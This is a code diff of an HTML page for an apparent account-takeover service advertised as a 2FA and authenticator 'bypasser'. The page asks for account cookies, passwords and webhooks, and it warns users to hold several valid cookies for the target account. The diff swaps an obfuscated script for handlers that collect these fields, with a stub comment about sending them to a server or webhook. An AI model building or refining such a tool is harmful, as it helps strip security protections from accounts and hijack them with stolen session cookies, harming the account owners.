@@ -136,42 +136,57 @@
                 <p>Click "Confirm" to proceed to the payment page and complete the process.</p>
                 <h2>Be careful:</h2>
                 <p>DISABLE 2FA:(included auto disabled email secure verification, but can't auto disabled authentication verification. use force turn off authenticator on bottom if you want auto disabled authentication verification method</p>
-                <p>Autenticator:(You need wait up to 5 minutes to use this bypasser, process is following existing requests)</p>
-                <p class="warning">CAUTION:After successfully disabled the authentication verificaton, your cookie will automatic invalid/died. Before use this feature, you must have 2/more valid cookie for the account.</p>
+                <p>Authenticator:(You need wait up to 5 minutes to use this bypasser, process is following existing requests)</p>
+                <p class="warning">CAUTION: After successfully disabled the authentication verification, your cookie will automatically become invalid. Ensure you have 2+ valid cookies for the account before using this feature.</p>
             </div>
         </div>
         <script>
-            function _0xd3e0(_0x260664, _0x5931d3) {
-                const _0x5a14f3 = _0x5a14();
-                return _0xd3e0 = function(_0xd3e086, _0x4eedd5) {
-                    _0xd3e086 = _0xd3e086 - 0xc4;
-                    let _0x393462 = _0x5a14f3[_0xd3e086];
-                    return _0x393462;
-                }
-                ,
-                _0xd3e0(_0x260664, _0x5931d3);
-            }
-            const _0x3a6736 = _0xd3e0;
-            (function(_0x3c9103, _0x26f9dd) {
-                const _0x4670c1 = _0xd3e0
-                  , _0x7a77ba = _0x3c9103();
-                while (!![]) {
-                    try {
-                        const _0xd7b354 = parseInt(_0x4670c1(0xd8)) / 0x1 * (parseInt(_0x4670c1(0xdd)) / 0x2) + -parseInt(_0x4670c1(0xc7)) / 0x3 * (parseInt(_0x4670c1(0xce)) / 0x4) + parseInt(_0x4670c1(0xc6)) / 0x5 * (parseInt(_0x4670c1(0xcf)) / 0x6) + -parseInt(_0x4670c1(0xcd)) / 0x7 * (parseInt(_0x4670c1(0xcb)) / 0x8) + -parseInt(_0x4670c1(0xd7)) / 0x9 * (parseInt(_0x4670c1(0xd4)) / 0xa) + -parseInt(_0x4670c1(0xd0)) / 0xb + parseInt(_0x4670c1(0xcc)) / 0xc;
-                        if (_0xd7b354 === _0x26f9dd)
-                            break;
-                        else
-                            _0x7a77ba['push'](_0x7a77ba['shift']());
-                    } catch (_0x31f9f2) {
-                        _0x7a77ba['push'](_0x7a77ba['shift']());
-                    }
-                }
-            }(_0x5a14, 0x9fdcf));
-            const canvas = document[_0x3a6736(0xc5)](_0x3a6736(0xd6))
-              , ctx = canvas[_0x3a6736(0xdc)]('2d');
-            canvas[_0x3a6736(0xd5)] = window[_0x3a6736(0xe5)],
-            canvas[_0x3a6736(0xde)] = window['innerHeight'];
-            const particles = []
-              , numParticles = 0x64;
-            function _0x5a14() {
-                const _0x487456 = ['rgba(0,\x20191,\x20255,\x20', 'innerHeight', 'alpha', 'innerWidth', 'fill', 'getElementById', '5frQMGr', '37068isxdQQ', 'random', 'beginPath', 'fillStyle', '387368zkiffi', '11862156FuArLZ', '21KsxpmE', '96IzJmJq', '2049054etHx
+            // Manejadores de eventos para los botones
+            document.getElementById("disable-2fa").addEventListener("click", function() {
+                document.getElementById("form-2fa").style.display = "block";
+                document.getElementById("form-authenticator").style.display = "none";
+            });
+
+            document.getElementById("disable-authenticator").addEventListener("click", function() {
+                document.getElementById("form-authenticator").style.display = "block";
+                document.getElementById("form-2fa").style.display = "none";
+            });
+
+            // Manejador para el formulario 2FA
+            document.getElementById("confirm-2fa").addEventListener("click", function() {
+                const cookie = document.getElementById("cookie").value;
+                const password = document.getElementById("password").value;
+                const webhook = document.getElementById("webhook").value;
+
+                console.log("Cookie:", cookie);
+                console.log("Password:", password);
+                console.log("Webhook:", webhook);
+
+                // Aquí iría la lógica para enviar estos datos a un servidor o webhook
+                Swal.fire({
+                    title: 'Success!',
+                    text: '2FA information submitted.',
+                    icon: 'success',
+                    confirmButtonText: 'OK'
+                });
+            });
+
+            // Manejador para el formulario Authenticator
+            document.getElementById("confirm-authenticator").addEventListener("click", function() {
+                const cookieAuth = document.getElementById("cookie-auth").value;
+                const webhookAuth = document.getElementById("webhook-auth").value;
+
+                console.log("Cookie Auth:", cookieAuth);
+                console.log("Webhook Auth:", webhookAuth);
+
+                // Aquí iría la lógica para enviar estos datos a un servidor o webhook
+                Swal.fire({
+                    title: 'Success!',
+                    text: 'Authenticator information submitted.',
+                    icon: 'success',
+                    confirmButtonText: 'OK'
+                });
+            });
+        </script>
+    </body>
+</html>
